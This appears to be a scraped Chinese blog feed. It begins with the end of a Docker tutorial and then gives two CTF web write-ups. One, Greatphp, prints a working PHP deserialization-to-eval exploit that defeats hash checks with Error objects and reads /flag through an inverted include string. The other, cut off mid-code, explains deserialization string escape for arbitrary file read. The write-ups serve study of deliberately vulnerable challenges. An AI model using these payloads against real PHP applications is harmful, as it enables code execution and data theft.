压缩包，jdk的压缩包！</p><p><img src="/2021/01/13/docker%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A-%E5%9B%9B/1607763531751.png" class="lazyload" data-srcset="/2021/01/13/docker%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A-%E5%9B%9B/1607763531751.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="1607763531751"></p></li><li><p>编写dockerfile文件 ，官方命名<code>Dockerfile</code></p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">FROM</span> centos</span><br><span class="line"><span class="keyword">MAINTAINER</span> moth&lt;<span class="number">1757186769</span>@qq.com&gt;</span><br><span class="line"></span><br><span class="line"><span class="keyword">COPY</span><span class="bash"> readme.txt /usr/<span class="built_in">local</span>/readme.txt</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">ADD</span><span class="bash"> jdk-15.0.1_linux-x64_bin.tar.gz /usr/<span class="built_in">local</span></span></span><br><span class="line"><span class="keyword">ADD</span><span class="bash"> apache-tomcat-9.0.41.tar.gz /usr/<span class="built_in">local</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> yum -y install vim</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">ENV</span> MYPATH /usr/local</span><br><span class="line"><span class="keyword">WORKDIR</span><span class="bash"> /usr/<span class="built_in">local</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">ENV</span> JAVA_HOME /usr/local/jdk-<span class="number">15.0</span>.<span class="number">1</span></span><br><span class="line"><span class="keyword">ENV</span> CLASSPATH $JAVA_HOME/lib/dt.jar:$JAVA_HOME/lib/tools.jar</span><br><span class="line"><span class="keyword">ENV</span> CATALINA_HOME /usr/local/apache-tomcat-<span class="number">9.0</span>.<span class="number">41</span></span><br><span class="line"><span class="keyword">ENV</span> CATALINA_BASH /usr/local/apache-tomcat-<span class="number">9.0</span>.<span class="number">41</span></span><br><span class="line"><span class="keyword">ENV</span> PATH $PATH:$JAVA_HOME/bin:$CATALINA_HOME/lib:$CATALINA_HOME/bin</span><br><span class="line"></span><br><span class="line"><span class="keyword">EXPOSE</span> <span class="number">8080</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">CMD</span><span class="bash"> /usr/<span class="built_in">local</span>/apache-tomcat-9.0.41/bin/startup.sh &amp;&amp; tail -f /usr/<span class="built_in">local</span>/apache-tomcat-9.0.41/logs/catalina.out</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">docker build -t mytomcat .</span><br><span class="line">docker run -d  -p 8080:8080 -v /root/tomcat/test:/usr/local/apache-tomcat-9.0.41/webapps/test -v /root/tomcat/tomcatlog:/usr/local/apache-tomcat-9.0.41/logs mytomcat</span><br><span class="line"></span><br></pre></td></tr></table></figure></li></ol><h2 id="发布镜像"><a href="#发布镜像" class="headerlink" title="发布镜像"></a>发布镜像</h2><hr><blockquote><p>Dockerhub</p></blockquote><ol><li><p>有一个dockerhub账号</p></li><li><p>在服务器上提交我们的镜像</p></li><li><p>登入dockerhub</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">[root@iz2zeg4zg69ldanw7ftdhez ~]# docker login --help</span><br><span class="line"></span><br><span class="line">Usage:  docker login [OPTIONS] [SERVER]</span><br><span class="line"></span><br><span class="line">Log in to a Docker registry.</span><br><span class="line">If no server is specified, the default is defined by the daemon.</span><br><span class="line"></span><br><span class="line">Options:</span><br><span class="line">  -p, --password string   Password</span><br><span class="line">      --password-stdin    Take the password from stdin</span><br><span class="line">  -u, --username string   Username</span><br><span class="line">[root@iz2zeg4zg69ldanw7ftdhez ~]# docker login -u moth404</span><br><span class="line">Password: </span><br><span class="line">WARNING! Your password will be stored unencrypted in /root/.docker/config.json.</span><br><span class="line">Configure a credential helper to remove this warning. See</span><br><span class="line">https://docs.docker.com/engine/reference/commandline/login/#credentials-store</span><br><span class="line"></span><br><span class="line">Login Succeeded</span><br></pre></td></tr></table></figure><p>4、登录完毕可以提交镜像，docker push</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">先改名 docker tag mycentos moth404/mycentos</span></span><br><span class="line">[root@iz2zeg4zg69ldanw7ftdhez dockertest]# docker push moth404/m</span><br><span class="line">Using default tag: latest</span><br><span class="line">The push refers to repository [docker.io/moth404/mycentos]</span><br><span class="line">cb098675aa0d: Layer already exists </span><br><span class="line">6d7590ebcc50: Layer already exists </span><br><span class="line">2653d992f4ef: Layer already exists </span><br><span class="line">latest: digest: sha256:3a7c792acf141aeae6e33391efa42a1ba1ae415f</span><br></pre></td></tr></table></figure><blockquote><p>push到阿里云镜像服务上</p></blockquote><ol><li><p>登录阿里云</p></li><li><p>找到容器镜像服务</p></li><li><p>创建命名空间</p><p><img src="/2021/01/13/docker%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A-%E5%9B%9B/image-20210113150421932.png" class="lazyload" data-srcset="/2021/01/13/docker%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A-%E5%9B%9B/image-20210113150421932.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210113150421932"></p></li><li><p>创建容器镜像</p><p><img src="/2021/01/13/docker%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A-%E5%9B%9B/image-20210113150739419.png" class="lazyload" data-srcset="/2021/01/13/docker%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A-%E5%9B%9B/image-20210113150739419.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210113150739419"></p></li><li><p>推送</p><p><img src="/2021/01/13/docker%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A-%E5%9B%9B/image-20210113150929880.png" class="lazyload" data-srcset="/2021/01/13/docker%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A-%E5%9B%9B/image-20210113150929880.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210113150929880"></p><h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><p><img src="/2021/01/13/docker%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A-%E5%9B%9B/image-20210113151216682.png" class="lazyload" data-srcset="/2021/01/13/docker%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A-%E5%9B%9B/image-20210113151216682.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210113151216682"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">[root@iz2zeg4zg69ldanw7ftdhez dockertest]# docker save mycentos -o test</span><br><span class="line">[root@iz2zeg4zg69ldanw7ftdhez dockertest]# ls</span><br><span class="line">dockerfile  test</span><br><span class="line">[root@iz2zeg4zg69ldanw7ftdhez dockertest]# docker images</span><br><span class="line">REPOSITORY         TAG       IMAGE ID       CREATED         SIZE</span><br><span class="line">moth404/mycentos   latest    64de2c9d4641   4 hours ago     282MB</span><br><span class="line">centos             latest    300e315adb2f   5 weeks ago     209MB</span><br><span class="line">hello-world        latest    bf756fb1ae65   12 months ago   13.3kB</span><br><span class="line">[root@iz2zeg4zg69ldanw7ftdhez dockertest]# docker load -i </span><br><span class="line">test</span><br><span class="line">Loaded image: mycentos:latest</span><br><span class="line">[root@iz2zeg4zg69ldanw7ftdhez dockertest]# docker images</span><br><span class="line">REPOSITORY         TAG       IMAGE ID       CREATED         SIZE</span><br><span class="line">mycentos           latest    64de2c9d4641   4 hours ago     282MB</span><br><span class="line">moth404/mycentos   latest    64de2c9d4641   4 hours ago     282MB</span><br><span class="line">centos             latest    300e315adb2f   5 weeks ago     209MB</span><br><span class="line">hello-world        latest    bf756fb1ae65   12 months ago   13.3kB</span><br><span class="line"></span><br></pre></td></tr></table></figure></li></ol></li></ol>]]></content>
      
      
      <categories>
          
          <category> linux运维 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> docker </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>[极客大挑战2020]Greatphp</title>
      <link href="2021/01/08/2020-Greatphp/"/>
      <url>2021/01/08/2020-Greatphp/</url>
      
        <content type="html"><![CDATA[<p>一个很有意思的绕过 trick</p><span id="more"></span><h2 id="0x01-源码分析"><a href="#0x01-源码分析" class="headerlink" title="0x01 源码分析"></a>0x01 源码分析</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SYCLOVER</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$syc</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$lover</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>( (<span class="keyword">$this</span>-&gt;syc != <span class="keyword">$this</span>-&gt;lover) &amp;&amp; (md5(<span class="keyword">$this</span>-&gt;syc) === md5(<span class="keyword">$this</span>-&gt;lover)) &amp;&amp; (sha1(<span class="keyword">$this</span>-&gt;syc)=== sha1(<span class="keyword">$this</span>-&gt;lover)) )&#123;</span><br><span class="line">           <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\&lt;\?php|\(|\)|\&quot;|\&#x27;/&quot;</span>, <span class="keyword">$this</span>-&gt;syc, <span class="variable">$match</span>))&#123;</span><br><span class="line">               <span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;syc);</span><br><span class="line">           &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">               <span class="keyword">die</span>(<span class="string">&quot;Try Hard !!&quot;</span>);</span><br><span class="line">           &#125;</span><br><span class="line">           </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;great&#x27;</span>]))&#123;</span><br><span class="line">    unserialize(<span class="variable">$_GET</span>[<span class="string">&#x27;great&#x27;</span>]);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>eval 很明显的rce漏洞，代码逻辑也很简单</p><p>整体思路就是通过unserialize反序列化触发_wakeup 绕过if判断 eval执行代码</p><h2 id="0x02-漏洞利用"><a href="#0x02-漏洞利用" class="headerlink" title="0x02 漏洞利用"></a>0x02 漏洞利用</h2><h3 id="bypass-hash"><a href="#bypass-hash" class="headerlink" title="bypass  hash"></a>bypass  hash</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(<span class="keyword">$this</span>-&gt;syc != <span class="keyword">$this</span>-&gt;lover) &amp;&amp; (md5(<span class="keyword">$this</span>-&gt;syc) === md5(<span class="keyword">$this</span>-&gt;lover)) &amp;&amp; (sha1(<span class="keyword">$this</span>-&gt;syc)=== sha1(<span class="keyword">$this</span>-&gt;lover))</span><br></pre></td></tr></table></figure><p>显然按照正常的思路我们可以通过0e的方式绕过，然而结合以下eval我们发现满足0e的字符串很难被当做php代码来执行</p><p>这里考了一个新的绕过hash的思路，即通过利用原生类，比如Error,Exception等进行绕过</p><p><strong>md5/sha1可以对一个类进行hash,会触发一个类的__toString方法</strong></p><p>我们可以通过以下方式绕过检测,</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="built_in">Error</span>(<span class="variable">$str</span>,<span class="number">1</span>);<span class="variable">$b</span>=<span class="keyword">new</span> <span class="built_in">Error</span>(<span class="variable">$str</span>,<span class="number">2</span>); <span class="comment">#$a与$b不相等,但是hash后相等，且报错字符串在同一行（必须在同一行才能绕过）</span></span><br></pre></td></tr></table></figure><h3 id="bypass-“-lt-php-quot-39-“"><a href="#bypass-“-lt-php-quot-39-“" class="headerlink" title="bypass   “/&lt;?php|(|)|&quot;|&#39;/“"></a>bypass   “/&lt;?php|(|)|&quot;|&#39;/“</h3><p>不能以&lt;?php开头且 不能有小括号 以及单双引号</p><h4 id="这里采用短开标签进行利用"><a href="#这里采用短开标签进行利用" class="headerlink" title="这里采用短开标签进行利用"></a>这里采用短开标签进行利用</h4><p>即 &lt;?= 与 &lt;?php echo等价 从而绕过了 &lt;?php的限制</p><p>最后可以构造</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SYCLOVER</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$syc</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$lover</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>( (<span class="keyword">$this</span>-&gt;syc != <span class="keyword">$this</span>-&gt;lover) &amp;&amp; (md5(<span class="keyword">$this</span>-&gt;syc) === md5(<span class="keyword">$this</span>-&gt;lover)) &amp;&amp; (sha1(<span class="keyword">$this</span>-&gt;syc)=== sha1(<span class="keyword">$this</span>-&gt;lover)) )&#123;</span><br><span class="line">            <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\&lt;\?php|\(|\)|\&quot;|\&#x27;/&quot;</span>, <span class="keyword">$this</span>-&gt;var1, <span class="variable">$match</span>))&#123;</span><br><span class="line">                <span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;syc);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&quot;Try Hard !!&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="number">1213</span>;</span><br><span class="line"><span class="variable">$str</span>=<span class="string">&quot;?&gt;&lt;?=include~&quot;</span>.urldecode(<span class="string">&quot;%D0%99%93%9E%98&quot;</span>).<span class="string">&quot;?&gt;&quot;</span>;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="built_in">Error</span>(<span class="variable">$str</span>,<span class="number">1</span>);<span class="variable">$b</span>=<span class="keyword">new</span> <span class="built_in">Error</span>(<span class="variable">$str</span>,<span class="number">2</span>);</span><br><span class="line"><span class="variable">$c</span> = <span class="keyword">new</span> SYCLOVER();</span><br><span class="line"><span class="variable">$c</span>-&gt;syc = <span class="variable">$a</span>;</span><br><span class="line"><span class="variable">$c</span>-&gt;lover = <span class="variable">$b</span>;</span><br><span class="line"><span class="keyword">echo</span>(urlencode(serialize(<span class="variable">$c</span>)));</span><br></pre></td></tr></table></figure><p>官方wp中的给的构造是</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$str1</span> = <span class="string">&quot;?&gt;&lt;?=include[~&quot;</span>.urldecode(<span class="string">&quot;%D0%99%93%9E%98&quot;</span>).<span class="string">&quot;][!&quot;</span>.urldecode(<span class="string">&quot;%FF&quot;</span>).<span class="string">&quot;]?&gt;&quot;</span>;</span><br></pre></td></tr></table></figure><p>都可以</p>]]></content>
      
      
      <categories>
          
          <category> ctf-Write up </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf-web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>反序列化字符逃逸总结&amp;&amp;[安洵杯2019]easy_serialize_php</title>
      <link href="2021/01/08/2019-easy-serialize-php/"/>
      <url>2021/01/08/2019-easy-serialize-php/</url>
      
        <content type="html"><![CDATA[<p>基于这道题，总结反序列化漏洞的成因，类型，利用方式</p><span id="more"></span><h2 id="0x01-反序列化字符逃逸漏洞总结"><a href="#0x01-反序列化字符逃逸漏洞总结" class="headerlink" title="0x01 反序列化字符逃逸漏洞总结"></a>0x01 反序列化字符逃逸漏洞总结</h2><p>字符逃逸是通过对生成的反序列化字符串进行字符数量不等的变化，从而使得部分属性统计数目不正确，但是通过一些优美的构造填补一些字符可以使其通过检测并且符合反序列化的语法，从而造成对象注入等漏洞，填补的字符处可以用来对象注入。</p><p>总之一句话</p><p><strong>漏洞成因：替换改变了反序列化字符串的长度</strong></p><p>漏洞类型其实也就两种</p><blockquote><ol><li>替换导致了反序列化字符串变长</li><li>替换导致了反序列化字符串变短</li></ol></blockquote><p>分开来看</p><h3 id="1-替换导致了反序列化字符串变长"><a href="#1-替换导致了反序列化字符串变长" class="headerlink" title="1.替换导致了反序列化字符串变长"></a>1.替换导致了反序列化字符串变长</h3><p>替换导致反序列化字符串变长，即可把替换点后面的部分字符串挤出，使得<strong>本属性值</strong>的部分字符串逃逸出来，精准构造后通过检测且符合反序列化的语法。（<strong>通常情况下，我们对插入字符串的点进行替换操作</strong>）</p><p>例如 [[0CTF 2016]piapiapia](./[0CTF 2016]piapiapia)</p><h3 id="2-替换导致了反序列化字符串变短"><a href="#2-替换导致了反序列化字符串变短" class="headerlink" title="2.替换导致了反序列化字符串变短"></a>2.替换导致了反序列化字符串变短</h3><p>替换导致了反序列化字符串变短，即可把替换点后面的部分字符串吞入，使得<strong>后面值</strong>字符串中构造的部分字符串逃逸出来，精准构造后通过检测且符合反序列化的语法。（<strong>通常情况下，我们对插入字符串的点前面的属性进行替换操作</strong>）</p><p>例如 本题</p><h2 id="0x02-本题的基于源码的本分析"><a href="#0x02-本题的基于源码的本分析" class="headerlink" title="0x02 本题的基于源码的本分析"></a>0x02 本题的基于源码的本分析</h2><p>题目友好，直接高亮源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$function</span> = @<span class="variable">$_GET</span>[<span class="string">&#x27;f&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$img</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$filter_arr</span> = <span class="keyword">array</span>(<span class="string">&#x27;php&#x27;</span>,<span class="string">&#x27;flag&#x27;</span>,<span class="string">&#x27;php5&#x27;</span>,<span class="string">&#x27;php4&#x27;</span>,<span class="string">&#x27;fl1g&#x27;</span>);</span><br><span class="line">    <span class="variable">$filter</span> = <span class="string">&#x27;/&#x27;</span>.implode(<span class="string">&#x27;|&#x27;</span>,<span class="variable">$filter_arr</span>).<span class="string">&#x27;/i&#x27;</span>;</span><br><span class="line">    <span class="keyword">return</span> preg_replace(<span class="variable">$filter</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$img</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_SESSION</span>)&#123;</span><br><span class="line">    <span class="keyword">unset</span>(<span class="variable">$_SESSION</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&quot;user&quot;</span>] = <span class="string">&#x27;guest&#x27;</span>;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;function&#x27;</span>] = <span class="variable">$function</span>;</span><br><span class="line"></span><br><span class="line">extract(<span class="variable">$_POST</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$function</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;a href=&quot;index.php?f=highlight_file&quot;&gt;source_code&lt;/a&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$_GET</span>[<span class="string">&#x27;img_path&#x27;</span>])&#123;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;img&#x27;</span>] = base64_encode(<span class="string">&#x27;guest_img.png&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;img&#x27;</span>] = sha1(base64_encode(<span class="variable">$_GET</span>[<span class="string">&#x27;img_path&#x27;</span>]));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$serialize_info</span> = filter(serialize(<span class="variable">$_SESSION</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$function</span> == <span class="string">&#x27;highlight_file&#x27;</span>)&#123;</span><br><span class="line">    highlight_file(<span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$function</span> == <span class="string">&#x27;phpinfo&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&#x27;phpinfo();&#x27;</span>); <span class="comment">//maybe you can find something in here! #查看发现flag在d0g3_f1ag.php</span></span><br><span class="line"><span class="comment">#base64编码后 ZDBnM19mMWFnLnBocA==</span></span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$function</span> == <span class="string">&#x27;show_image&#x27;</span>)&#123;</span><br><span class="line">    <span class="variable">$userinfo</span> = unserialize(<span class="variable">$serialize_info</span>);</span><br><span class="line">    <span class="keyword">echo</span> file_get_contents(base64_decode(<span class="variable">$userinfo</span>[<span class="string">&#x27;img&#x27;</span>]));</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>分析逻辑也较为简单，post传参extract为程序的变量键和值</p><p>最终对$_SESSION进行了filter函数过滤并进行了反序列化操作,并且file_get_contents了反序列完成后数组的img键所对应的值，显然，该值是文件名字符串</p><p>我们要覆盖img键值对，从而实现任意文件读取漏洞</p><p>我们看一下filter函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$img</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$filter_arr</span> = <span class="keyword">array</span>(<span class="string">&#x27;php&#x27;</span>,<span class="string">&#x27;flag&#x27;</span>,<span class="string">&#x27;php5&#x27;</span>,<span class="string">&#x27;php4&#x27;</span>,<span class="string">&#x27;fl1g&#x27;</span>);</span><br><span class="line">    <span class="variable">$filter</span> = <span class="string">&#x27;/&#x27;</span>.implode(<span class="string">&#x27;|&#x27;</span>,<span class="variable">$filter_arr</span>).<span class="string">&#x27;/i&#x27;</span>;</span><br><span class="line">    <span class="keyword">return</span> preg_replace(<span class="variable">$filter</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$img</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>对黑名单数组中的值进行了替换，从而打乱的反序列化字符串自身的结构</p><p>容易联想反序列化字符逃逸漏洞</p><h2 id="0x03-反序列化字符逃逸漏洞利用"><a href="#0x03-反序列化字符逃逸漏洞利用" class="headerlink" title="0x03 反序列化字符逃逸漏洞利用"></a>0x03 反序列化字符逃逸漏洞利用</h2><p>很明显，本题属于替换导致了反序列化字符串变短</p><p><code>extract($_POST);</code> </p><p>通过此函数我们可以post传入 <code>_SESSION[]=</code> 形式的数据从而使得SESSION数组中增加了成对的键和值</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>]=<span class="string">&#x27;guest&#x27;</span>;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span 